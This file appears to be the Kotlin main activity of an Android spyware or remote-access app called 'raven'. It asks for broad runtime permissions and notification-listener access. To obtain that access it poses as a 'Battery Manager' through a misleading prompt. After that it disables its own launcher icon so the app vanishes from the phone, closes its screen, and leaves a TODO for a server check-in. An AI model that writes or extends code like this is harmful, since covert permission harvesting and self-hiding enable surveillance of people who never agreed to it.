package com.project.raven

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationManagerCompat

class MainActivity : AppCompatActivity() {

    private val PERM_REQUEST_CODE = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main) 

        val btnStart = findViewById<Button>(R.id.btnStartSetup)
        btnStart.setOnClickListener {
             checkAndRequestPermissions()
        }

        // Auto-check on launch if already granted
        if (allPermissionsGranted()) {
            startAgentAndDisappear()
        }
    }

    private fun checkAndRequestPermissions() {
        // 1. Runtime Permissions (Location, Camera, etc.)
        if (!PermissionManager.hasAllPermissions(this)) {
            PermissionManager.requestAllPermissions(this, PERM_REQUEST_CODE)
            return
        }

        // 2. Special Permission: Notification Access
        if (!isNotificationServiceEnabled()) {
            Toast.makeText(this, "Please enable 'Battery Manager' to optimize notifications.", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            return
        }

        // 3. All Good
        startAgentAndDisappear()
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val packageName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun allPermissionsGranted(): Boolean {
        return PermissionManager.hasAllPermissions(this) && isNotificationServiceEnabled()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERM_REQUEST_CODE) {
            // After runtime permissions, check everything again (including Notification Access)
            checkAndRequestPermissions()
        }
    }


    private fun startAgentAndDisappear() {
        // 1. Send "I am alive" to server (TODO)
        
        // 2. Hide the app icon
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        // 3. Close UI
        finish()
    }
}
